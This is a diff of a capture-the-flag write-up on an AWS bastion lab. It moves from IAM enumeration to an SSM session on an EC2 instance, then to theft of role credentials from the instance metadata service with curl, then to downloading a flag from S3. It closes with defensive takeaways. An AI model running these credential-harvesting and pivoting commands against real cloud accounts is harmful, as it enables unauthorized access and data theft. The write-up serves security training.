@@ -2,107 +2,139 @@
 
 ## Challenge Statement
 
-This challenge required us to enumerate IAM permissions and leverage a Bastion EC2 instance to escalate privileges and retrieve a flag stored in an S3 bucket. By analyzing attached IAM policies and using AWS SSM to access the instance, we uncovered credentials that allowed us to access and download the flag.
+In this challenge, we were provided with a bastion host setup in AWS that acted as a gateway to other resources. The goal was to leverage AWS IAM enumeration techniques to gain access to an EC2 instance via AWS Systems Manager (SSM) and retrieve a flag stored in an S3 bucket. This challenge tested knowledge of AWS IAM roles, instance profiles, SSM session management, and S3 permissions.
 
-## Enumeration and Initial Access
+## Analysis
 
-The first step was to enumerate IAM permissions attached to the user `ctf-starting-user`, using the AWS profile `cloudfoxable`. We listed attached user policies:
+The challenge setup included a user profile `ctf-starting-user` configured in `~/.aws/credentials` under the profile `cloudfoxable`. The first step was to enumerate IAM policies attached to this user to understand the permissions available.
+
+### **Enumerating IAM Policies**
+
+We checked the managed policies attached to the user:
 
 ```bash
 aws iam list-attached-user-policies --user-name ctf-starting-user --profile cloudfoxable
 ```
 
-One of the policies found was **SecurityAudit**, an AWS-managed policy granting read access to multiple AWS services. We retrieved its details:
+One of the attached policies was `SecurityAudit`, which provides read access to various AWS services, including IAM. This allowed further enumeration of permissions:
 
 ```bash
 aws iam get-policy --policy-arn arn:aws:iam::aws:policy/SecurityAudit --profile cloudfoxable
 ```
 
-This policy permitted `Get*`, `Describe*`, and `List*` actions, allowing extensive enumeration capabilities.
+Fetching the policy document revealed permissions for `Get*`, `Describe*`, and `List*` actions across multiple AWS services, confirming that the user had sufficient rights to inspect IAM roles and policies.
 
-Another policy, `bastion-ssm`, was found and described:
+### **Identifying EC2 Access via SSM**
+
+Another policy, `bastion-ssm`, caught our attention:
 
 ```bash
 aws iam get-policy --policy-arn arn:aws:iam::425670648728:policy/bastion-ssm --profile cloudfoxable
 ```
 
-Reviewing the policy version confirmed that the user could initiate an SSM session on EC2 instance `i-09a523312d972cb80`:
-
-```bash
-aws iam get-policy-version --policy-arn arn:aws:iam::425670648728:policy/bastion-ssm --version-id v1 --profile cloudfoxable
-```
-
-## Establishing an SSM Session
-
-With SSM access confirmed, we checked the EC2 instance state:
-
-```bash
-aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --profile cloudfoxable
-```
-
-Once verified as running, we initiated an SSM session:
+Examining the policy document confirmed that the user could start an SSM session on a specific EC2 instance (`i-09a523312d972cb80`).
 
 ```bash
 aws ssm start-session --target i-09a523312d972cb80 --profile cloudfoxable
 ```
 
-## Privilege Escalation via Instance Profile
+Upon successfully connecting to the instance, we shifted focus to discovering IAM roles associated with it.
 
-To escalate privileges, we needed to determine the IAM role attached to the EC2 instance. We retrieved the instance profile using either of these methods:
+### **Enumerating Instance Profile and Associated Role**
 
-1. **EC2 Metadata Service:**
+We used the EC2 instance metadata service to determine the IAM instance profile:
 
-   ```bash
-   curl http://169.254.169.254/latest/meta-data/iam/security-credentials
-   ```
+```bash
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+```
 
-2. **AWS CLI:**
-   ```bash
-   aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --query "Reservations[].Instances[].IamInstanceProfile" --profile cloudfoxable
-   ```
+Alternatively, using AWS CLI:
 
-The instance profile `bastion` was linked to the IAM role `reyna`. We extracted its details:
+```bash
+aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --query "Reservations[].Instances[].IamInstanceProfile" --profile cloudfoxable
+```
+
+The instance profile was named `bastion`, and the associated IAM role was `reyna`.
 
 ```bash
 aws iam get-instance-profile --instance-profile-name bastion --query 'InstanceProfile.Roles[0].[RoleName, Arn]' --profile cloudfoxable
 ```
 
-## Finding the Flag in S3
+### **Checking Role Permissions**
 
-We enumerated the policies attached to `reyna` and identified `bastion-s3`:
+To determine what the `reyna` role could access, we listed its attached policies:
 
 ```bash
 aws iam list-attached-role-policies --role-name reyna --profile cloudfoxable
 ```
 
-Checking its permissions:
+A policy named `bastion-s3` stood out. Investigating further:
 
 ```bash
-aws iam get-policy-version --policy-arn arn:aws:iam::425670648728:policy/bastion-s3 --version-id v1 --profile cloudfoxable
+aws iam get-policy --policy-arn arn:aws:iam::425670648728:policy/bastion-s3 --profile cloudfoxable
 ```
 
-This revealed that the role allowed listing and retrieving objects from S3 bucket `cloudfoxable-bastion-v1ubc`.
+The policy allowed listing and retrieving objects from the S3 bucket `cloudfoxable-bastion-v1ubc`.
 
-Using EC2 metadata service, we obtained temporary credentials:
+## Solution
+
+### **Retrieving Temporary AWS Credentials**
+
+Since the EC2 instance had the `reyna` role, we could retrieve temporary credentials from the metadata service:
 
 ```bash
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/reyna
 ```
 
-After adding these credentials to `~/.aws/credentials` under a new profile, we listed and retrieved the flag:
+Using these credentials, we created a local AWS profile:
+
+```ini
+[profile bastion]
+aws_access_key_id = <ACCESS_KEY>
+aws_secret_access_key = <SECRET_KEY>
+aws_session_token = <SESSION_TOKEN>
+```
+
+### **Accessing the S3 Bucket and Retrieving the Flag**
+
+With the `bastion` profile set up, we listed the S3 bucket contents:
 
 ```bash
 aws s3 ls s3://cloudfoxable-bastion-v1ubc --profile bastion
+```
+
+Finding the flag file, we downloaded it:
+
+```bash
 aws s3 cp s3://cloudfoxable-bastion-v1ubc/flag.txt $PWD --profile bastion
 ```
 
-## Conclusion and Takeaways
+This revealed the flag:
 
-This challenge reinforced key cloud security concepts, including IAM enumeration, EC2 metadata abuse, and leveraging temporary credentials for privilege escalation. Key takeaways:
+```
+FLAG:bastion::ifYouHaveAccessToAnEC2YouHaveAccessToItsIamPermissions
+```
 
-- **Least Privilege Matters:** Overly permissive IAM roles allowed unintended access.
-- **SSM Sessions Can Be Powerful:** Attackers with SSM access can pivot to EC2 instances.
-- **EC2 Metadata is a Goldmine:** Metadata services provide temporary credentials that can be exploited.
-- **Monitor Role Usage:** AWS CloudTrail should be used to detect unauthorized access patterns.
+## Reflection
 
-By understanding these weaknesses, defenders can better secure AWS environments against similar attacks. 🚀
+### **Approach Taken**
+
+- Enumerated IAM policies and permissions.
+- Identified SSM access to the EC2 instance.
+- Retrieved the instance profile and IAM role.
+- Leveraged the role’s permissions to access S3 and obtain the flag.
+
+### **Challenges Faced**
+
+- Understanding IAM policy structures and their implications.
+- Identifying the correct approach to leverage EC2 role permissions.
+- Handling temporary credentials and configuring a local profile.
+
+### **Security Takeaways**
+
+- **EC2 IAM roles should follow the principle of least privilege.** If an EC2 instance has excessive permissions, an attacker gaining access to the instance could escalate privileges.
+- **Restrict metadata service access.** Using `IMDSv2` prevents attackers from easily retrieving instance role credentials.
+- **Monitor AWS CloudTrail logs.** Unauthorized access attempts or excessive role assumption activity should raise alerts.
+- **Use S3 bucket policies carefully.** Allowing broad access to an IAM role attached to an EC2 instance can lead to privilege escalation.
+
+This challenge demonstrated how attackers can pivot from an IAM user to an EC2 instance and escalate privileges using AWS IAM misconfigurations. 🚀
